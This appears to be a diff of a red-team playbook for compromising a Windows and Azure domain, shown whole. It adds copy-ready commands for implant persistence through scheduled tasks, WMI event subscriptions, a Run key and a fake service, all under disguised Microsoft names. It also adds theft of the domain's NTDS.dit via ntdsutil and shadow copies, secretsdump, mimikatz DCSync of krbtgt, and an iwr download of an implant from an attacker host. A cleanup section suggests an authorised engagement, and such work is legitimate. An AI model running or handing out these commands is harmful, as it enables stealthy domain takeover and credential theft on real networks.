@@ -515,6 +515,20 @@ All execute-assembly tools are in one directory:
 └── SharpDPAPI.exe       # DPAPI credential blobs
 ```
 
+
+### 9b: Persist on httpserver (Scheduled Task)
+
+Set persistence BEFORE moving to the next hop:
+
+```
+# From Sliver session on httpserver
+shell
+schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /tr "C:\ProgramData\Microsoft\Network\teams.exe" /sc onstart /ru SYSTEM /f
+schtasks /create /tn "\Microsoft\Windows\Maintenance\WinSAT" /tr "C:\ProgramData\Microsoft\Network\teams.exe" /sc minute /mo 15 /ru SYSTEM /f
+schtasks /query /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /v /fo list
+exit
+```
+
 ---
 
 ## Step 10: Lateral Movement — evil-winrm via SOCKS Proxy
@@ -710,9 +724,30 @@ nltest /domain_trusts /all_trusts
 Get-Service | Where-Object {$_.DisplayName -like '*SQL*'} | Format-Table Name, Status, DisplayName
 ```
 
+
+### 11g: Persist on DBServer (WMI Event Subscription)
+
+```powershell
+# From evil-winrm session on DBServer
+# Upload implant
+upload /root/sliver/tools/sharp-tools/teams-db.exe C:\ProgramData\Microsoft\Network\svchost.exe
+
+# WMI permanent event subscription (survives reboots, very stealthy)
+$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name="WindowsParityFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"}
+
+$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name="WindowsParityConsumer"; CommandLineTemplate="C:\ProgramData\Microsoft\Network\svchost.exe"}
+
+Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
+
+# Verify
+Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
+```
+
 ---
 
 ## Step 12: DC Takeover via RunCommand
+
+### 12a: Full AD Dump
 
 ```powershell
 $adScript = @"
@@ -726,90 +761,58 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServ
   -CommandId "RunPowerShellScript" -ScriptString $adScript
 ```
 
----
-
-
----
-
-## Step 13: Persistence (Different Method Per Hop)
-
-Each hop gets a different persistence method to avoid single-point detection.
-
-### 13a: httpserver — Scheduled Task (schtasks)
+### 12b: NTDS.dit Exfiltration (Domain Hashes)
 
 ```powershell
-# From Sliver session or RunCommand on httpserver
-# Create a scheduled task that runs the implant at boot + every 15 min
-schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" `
-  /tr "C:\ProgramData\Microsoft\Network\teams.exe" `
-  /sc onstart /ru SYSTEM /f
+# Method 1: ntdsutil IFM (creates a copy of NTDS.dit + SYSTEM hive)
+$ntds = @'
+ntdsutil "ac in ntds" "ifm" "create full C:\Windows\Temp\ntds_dump" q q
+Compress-Archive -Path C:\Windows\Temp\ntds_dump -DestinationPath C:\Windows\Temp\ntds.zip -Force
+Get-Item C:\Windows\Temp\ntds.zip | Select Name,Length
+'@
 
-schtasks /create /tn "\Microsoft\Windows\Maintenance\WinSAT" `
-  /tr "C:\ProgramData\Microsoft\Network\teams.exe" `
-  /sc minute /mo 15 /ru SYSTEM /f
-
-# Verify
-schtasks /query /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /v /fo list
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $ntds
 ```
 
-### 13b: DBServer — WMI Event Subscription
-
 ```powershell
-# From evil-winrm session on DBServer
-# WMI permanent event subscription — survives reboots, very stealthy
+# Method 2: VSS shadow copy (if ntdsutil blocked)
+$vss = @'
+$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\","ClientAccessible")
+$shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select -First 1).DeviceObject
+cmd /c copy "${shadowPath}\Windows\NTDS\ntds.dit" C:\Windows\Temp\ntds.dit
+cmd /c copy "${shadowPath}\Windows\System32\config\SYSTEM" C:\Windows\Temp\SYSTEM
+Compress-Archive -Path C:\Windows\Temp\ntds.dit,C:\Windows\Temp\SYSTEM -DestinationPath C:\Windows\Temp\ntds.zip -Force
+Get-Item C:\Windows\Temp\ntds.zip | Select Name,Length
+'@
 
-# First upload implant to DBServer
-upload /root/sliver/tools/sharp-tools/teams-db.exe C:\ProgramData\Microsoft\Network\svchost.exe
-
-# Create WMI event filter (triggers 5 min after boot)
-$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
-  -Arguments @{
-    Name = "WindowsParityFilter"
-    EventNamespace = "root\cimv2"
-    QueryLanguage = "WQL"
-    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
-  }
-
-# Create consumer (runs the implant)
-$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
-  -Arguments @{
-    Name = "WindowsParityConsumer"
-    CommandLineTemplate = "C:\ProgramData\Microsoft\Network\svchost.exe"
-  }
-
-# Bind filter to consumer
-Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
-  -Arguments @{
-    Filter = $filter
-    Consumer = $consumer
-  }
-
-# Verify
-Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
-Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $vss
 ```
 
-### 13c: DC — Registry Run Key + Service
+Then download from DC (via lateral move through httpserver or download via RunCommand output):
+```bash
+# On Kali: extract hashes
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+### 12c: DCSync via Sliver (If You Have a Session on DC)
+
+```
+# From Sliver session with DA creds
+mimikatz lsadump::dcsync /user:contoso\krbtgt
+mimikatz lsadump::dcsync /user:contoso\Administrator
+```
+
+### 12d: Persist on DC (Registry Run Key + Service)
 
 ```powershell
-# From RunCommand on DC (already SYSTEM)
-# Method 1: Registry Run key
-$regPersist = @'
-# Upload implant first via RunCommand
-iwr http://YOUR_KALI_IP:8080/teams-dc.exe -OutFile C:\ProgramData\Microsoft\Network\DiagTrack.exe -UseBasicParsing
+$dcPersist = @'
+# Registry Run key
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "DiagnosticsTrackingService" -Value "C:\ProgramData\Microsoft\Network\DiagTrack.exe" -PropertyType String -Force
 
-# Registry Run key (runs at every user logon)
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
-  -Name "DiagnosticsTrackingService" -Value "C:\ProgramData\Microsoft\Network\DiagTrack.exe" `
-  -PropertyType String -Force
-
-# Method 2: Create a Windows service (runs at boot as SYSTEM)
-New-Service -Name "DiagTrack2" `
-  -BinaryPathName "C:\ProgramData\Microsoft\Network\DiagTrack.exe" `
-  -DisplayName "Diagnostics Tracking Service 2" `
-  -StartupType Automatic `
-  -Description "Connected User Experiences and Telemetry secondary service"
-
+# Windows service (runs at boot as SYSTEM)
+New-Service -Name "DiagTrack2" -BinaryPathName "C:\ProgramData\Microsoft\Network\DiagTrack.exe" -DisplayName "Diagnostics Tracking Service 2" -StartupType Automatic -Description "Connected User Experiences and Telemetry secondary service"
 Start-Service DiagTrack2
 
 # Verify
@@ -817,26 +820,39 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Select 
 Get-Service DiagTrack2
 '@
 
+# First drop the implant, then set persistence
+$drop = 'iwr http://YOUR_KALI_IP:8080/teams-dc.exe -OutFile C:\ProgramData\Microsoft\Network\DiagTrack.exe -UseBasicParsing'
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
-  -CommandId "RunPowerShellScript" -ScriptString $regPersist
+  -CommandId "RunPowerShellScript" -ScriptString $drop
+
+# Then persist
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $dcPersist
 ```
 
-### Persistence Cleanup (When Engagement Ends)
+### Persistence Cleanup (End of Engagement)
 
 ```powershell
-# httpserver — remove schtask
+# httpserver
 schtasks /delete /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /f
 schtasks /delete /tn "\Microsoft\Windows\Maintenance\WinSAT" /f
 
-# DBServer — remove WMI subscription
+# DBServer (from evil-winrm)
 Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*Parity*' } | Remove-WmiObject
 Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -like '*Parity*' } | Remove-WmiObject
 Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object { $_.Name -like '*Parity*' } | Remove-WmiObject
 
-# DC — remove service + reg key
-Stop-Service DiagTrack2 -Force; Remove-Service DiagTrack2
+# DC
+Stop-Service DiagTrack2 -Force; sc.exe delete DiagTrack2
 Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "DiagnosticsTrackingService" -Force
 ```
+
+---
+
+
+---
+
+
 ## Troubleshooting
 
 ### Implant blocked by Defender
